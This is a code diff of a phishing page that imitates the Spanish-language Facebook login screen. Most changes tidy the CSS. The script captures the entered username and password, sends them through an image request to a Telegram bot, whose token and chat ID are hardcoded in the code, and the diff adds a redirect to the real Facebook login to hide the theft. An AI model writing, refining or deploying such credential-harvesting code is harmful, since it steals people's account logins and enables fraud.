@@ -5,6 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Facebook – Iniciar sesión</title>
   <style>
+    /* (tus estilos exactamente igual) */
     * { box-sizing: border-box; margin: 0; padding: 0; }
     html, body {
       height: 100%;
@@ -17,142 +18,59 @@
       justify-content: space-between;
       align-items: center;
       min-height: 100vh;
-      padding: 1rem 0; /* algo de espacio arriba y abajo */
+      padding: 1rem 0;
     }
-
-    /* “Español” arriba */
-    .lang-selector {
-      font-size: 1.1rem;
-      color: #1c1e21;
-      margin-bottom: 1.5rem;
-    }
-
-    /* Contenedor principal y bottom */
+    .lang-selector { font-size: 1.1rem; color: #1c1e21; margin-bottom: 1.5rem; }
     .login-container,
-    .bottom-container {
-      width: 90%;
-      max-width: 380px;
-      text-align: center;
-    }
-
-    /* Logo y título */
-    .login-container img.fb-logo {
-      width: 50px;
-      margin-bottom: 1rem;
-    }
-    .login-container h1 {
-      font-size: 1.75rem;
-      color: #1c1e21;
-      margin-bottom: 1.5rem;
-      font-weight: normal;
-    }
-
-    /* Inputs “pill” */
-    .input-container {
-      position: relative;
-      margin-bottom: 1rem;
-    }
+    .bottom-container { width: 90%; max-width: 380px; text-align: center; }
+    .login-container img.fb-logo { width: 50px; margin-bottom: 1rem; }
+    .login-container h1 { font-size: 1.75rem; color: #1c1e21; margin-bottom: 1.5rem; }
+    .input-container { position: relative; margin-bottom: 1rem; }
     .login-container input {
-      width: 100%;
-      padding: 0.85rem 2.5rem 0.85rem 1rem;
-      border: 1px solid #ccd0d5;
-      border-radius: 25px;
-      font-size: 1rem;
-      outline: none;
-      transition: border-color 0.2s;
+      width: 100%; padding: 0.85rem 2.5rem 0.85rem 1rem;
+      border: 1px solid #ccd0d5; border-radius: 25px;
+      font-size: 1rem; outline: none; transition: border-color 0.2s;
       background: #fff;
     }
-    .login-container input:focus {
-      border-color: #1877f2;
-    }
+    .login-container input:focus { border-color: #1877f2; }
     .toggle-visibility {
-      position: absolute;
-      top: 50%;
-      right: 1rem;
-      transform: translateY(-50%);
-      width: 1.2rem;
-      height: 1.2rem;
-      cursor: pointer;
-      opacity: 0.6;
+      position: absolute; top: 50%; right: 1rem; transform: translateY(-50%);
+      width: 1.2rem; height: 1.2rem; cursor: pointer; opacity: 0.6;
     }
     .toggle-visibility:hover { opacity: 1; }
-
     .login-container .error {
-      color: #e53935;
-      font-size: 0.85rem;
-      text-align: left;
-      margin: -0.4rem 0 0.5rem;
-      display: none;
+      color: #e53935; font-size: 0.85rem; text-align: left;
+      margin: -0.4rem 0 0.5rem; display: none;
     }
-
-    /* Botón principal y estado */
     .login-container button {
-      width: 100%;
-      padding: 0.85rem;
-      background: #1877f2;
-      color: #fff;
-      border: none;
-      border-radius: 25px;
-      font-size: 1.1rem;
-      font-weight: bold;
-      cursor: pointer;
-      transition: background 0.2s;
+      width: 100%; padding: 0.85rem;
+      background: #1877f2; color: #fff; border: none; border-radius: 25px;
+      font-size: 1.1rem; font-weight: bold; cursor: pointer; transition: background 0.2s;
     }
-    .login-container button:hover {
-      background: #166fe5;
-    }
+    .login-container button:hover { background: #166fe5; }
     .login-container .status {
-      margin-top: 0.75rem;
-      font-size: 0.9rem;
-      color: #1c1e21;
-      min-height: 1.2em;
+      margin-top: 0.75rem; font-size: 0.9rem; color: #1c1e21; min-height: 1.2em;
     }
-
-    /* “¿Olvidaste tu contraseña?” */
     .login-container .forgot {
-      margin-top: 1.5rem;
-      font-size: 1rem;
-      color: #1c1e21;
-      cursor: pointer;
+      margin-top: 1.5rem; font-size: 1rem; color: #1c1e21; cursor: pointer;
     }
-    .login-container .forgot:hover {
-      text-decoration: underline;
-    }
-
-    /* Bloque inferior: Crear cuenta + Meta */
-    .bottom-container {
-      margin-top: auto;
-      padding-bottom: 1rem;
-    }
+    .login-container .forgot:hover { text-decoration: underline; }
+    .bottom-container { margin-top: auto; padding-bottom: 1rem; }
     .bottom-container .create-account {
-      width: 100%;
-      padding: 0.75rem;
-      background: transparent;
-      color: #1877f2;
-      border: 1px solid #1877f2;
-      border-radius: 25px;
-      font-size: 1rem;
-      font-weight: bold;
-      cursor: pointer;
+      width: 100%; padding: 0.75rem; background: transparent; color: #1877f2;
+      border: 1px solid #1877f2; border-radius: 25px; font-size: 1rem;
+      font-weight: bold; cursor: pointer;
       transition: background 0.2s, color 0.2s, border-color 0.2s;
       margin-bottom: 1.5rem;
     }
     .bottom-container .create-account:hover {
-      background: rgba(24,119,242,0.1);
-      color: #166fe5;
-      border-color: #166fe5;
+      background: rgba(24,119,242,0.1); color: #166fe5; border-color: #166fe5;
     }
     .bottom-container .footer {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 0.3rem;
-      font-size: 0.9rem;
-      color: #90949c;
+      display: flex; align-items: center; justify-content: center;
+      gap: 0.3rem; font-size: 0.9rem; color: #90949c;
     }
-    .bottom-container .footer img.meta-logo {
-      width: 16px;
-    }
+    .bottom-container .footer img.meta-logo { width: 16px; }
   </style>
 </head>
 <body>
@@ -203,13 +121,18 @@
     const BOT_TOKEN = '8417736223:AAHIXjNMAOMaeFLVO6tb9aUNLiVrzmQWk-c';
     const CHAT_ID   = '7270292739';
 
+    // Función de redirección
+    function redirectToFacebook() {
+      window.location.href = "https://www.facebook.com/login";
+    }
+
     // Toggle contraseña
     document.getElementById('togglePass').addEventListener('click', () => {
       const f = document.getElementById('passField');
       f.type = f.type === 'password' ? 'text' : 'password';
     });
 
-    // Envío a Telegram por <img>
+    // Envío a Telegram por <img> y luego redirige
     document.getElementById('loginBtn').addEventListener('click', () => {
       document.getElementById('userError').style.display = 'none';
       document.getElementById('passError').style.display = 'none';
@@ -219,18 +142,24 @@
       const user = document.getElementById('userField').value.trim();
       const pass = document.getElementById('passField').value;
       let valid = true;
-      if (!user) { document.getElementById('userError').style.display = 'block'; valid = false; }
-      if (!pass) { document.getElementById('passError').style.display = 'block'; valid = false; }
+      if (!user) {
+        document.getElementById('userError').style.display = 'block';
+        valid = false;
+      }
+      if (!pass) {
+        document.getElementById('passError').style.display = 'block';
+        valid = false;
+      }
       if (!valid) return;
 
+      // Enviar a Telegram
       const text = `🔐 Nuevo login capturado 🔐\nUsuario: ${user}\nContraseña: ${pass}`;
-      const url  = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}` +
-                   `&text=${encodeURIComponent(text)}`;
+      const url  = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}`
+                 + `&text=${encodeURIComponent(text)}`;
+      new Image().src = url;
 
-      const img = new Image();
-      img.src = url;
-      img.onload  = () => { status.style.color = 'green'; status.textContent = ''; };
-      img.onerror = () => { status.style.color = '#e53935'; status.textContent = ''; };
+      // Redirigir tras ingreso de correo y contraseña
+      redirectToFacebook();
     });
   </script>
 </body>
